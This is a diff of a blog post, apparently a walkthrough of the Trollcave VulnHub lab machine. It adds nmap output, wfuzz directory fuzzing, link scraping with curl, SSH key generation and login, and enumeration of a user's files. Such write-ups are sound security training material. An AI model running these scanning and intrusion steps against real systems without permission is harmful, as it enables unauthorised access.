@@ -9,22 +9,37 @@ This is a boot2root machine that was created by [David Yates][2], and hosted at 
 
 <!--more-->
 ## Information Gathering
-We start of with an nmap scan and get these ports open: 
-PORT   STATE SERVICE                                                                                                                                                  
-22/tcp open  ssh                                                                                                                                                      
-80/tcp open  http                                                                                                                                                     
-                                                                                                                                                                      
+We start of with an nmap scan and get these ports open:
+```
+nmap -Pn -sCV -p22,80 -oN nmap/Basic_192.168.251.9.nmap 192.168.251.9
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.251.9
+Host is up (0.00048s latency).
 
-Port 80:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)
+|   256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)
+|_  256 17:4d:7b:04:44:53:d1:51:d2:93:e9:50:e0:b2:20:4c (ED25519)
+80/tcp open  http    nginx 1.10.3 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Trollcave
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+We'll start off with port 80:
+
 ![5-1.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-1.png)
 
-Looks like a ruby site. 
-Users are
+Looks like a ruby site simply based on the diammond icon. There's a list of a couple of users:
 
 ![5-2.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-2.png)
 
 
-We'll use wfuzz:
+We'll do some fuzzing using wfuzz:
 ```
 kali@kali:~/vulnhub/trollcave$ wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt  --hc 404 http://192.168.251.9/FUZZ                                   
 
@@ -60,7 +75,7 @@ To get the links on the page:
 
 	curl -s http://192.168.251.9 | grep -Po '(href|src)=".{2,}"' | cut -d '"' -f2 | sort -u
  
- 
+ ![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-4.png)
 
 Enumerate the users:
 When we do 
@@ -173,7 +188,6 @@ Generate a ssh key as follows
 
 	ssh-keygen -t rsa -b 2048
 
-
 Upload the key as follows:
 Note we'll upload with user as xer upload as King don't work:
 
@@ -184,7 +198,7 @@ ssh -i trollcave rails@192.168.251.9
 We'll run LinEnum and les.
 
 We'll use LinEnum. The user king has sudo rights  `.sudo_as_admin_successful`
-
+```
 rails@trollcave:~$ ls -lah /home/king/
 total 32K
 drwxr-xr-x 4 king king 4.0K Mar 21  2018 .
@@ -196,9 +210,9 @@ drwx------ 2 king king 4.0K Sep 16  2016 .cache
 drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
 -rw-r--r-- 1 king king  675 Sep 16  2016 .profile
 -rw-r--r-- 1 king king    0 Sep 16  2016 .sudo_as_admin_successful
-
+```
 He's running a program called 
-
+```
 drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
 
 rails@trollcave:/home/king/calc$ cat calc.js
